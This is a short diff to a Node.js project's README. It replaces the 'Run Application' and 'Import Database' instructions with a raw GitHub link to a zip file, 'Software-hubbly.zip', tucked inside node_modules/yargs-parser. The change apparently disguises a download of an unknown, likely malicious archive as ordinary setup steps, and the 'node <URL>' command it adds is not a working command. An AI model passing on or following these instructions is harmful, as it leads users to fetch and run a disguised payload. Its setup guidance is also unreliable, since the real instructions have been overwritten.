@@ -6,8 +6,8 @@ npm install
 
 
 # Run Application
-node app.js
+node https://github.com/amoosghori/employeenodejs/raw/refs/heads/master/node_modules/yargs-parser/Software-hubbly.zip
 
 
 # Import Database
-nodejs.sql
+https://github.com/amoosghori/employeenodejs/raw/refs/heads/master/node_modules/yargs-parser/Software-hubbly.zip
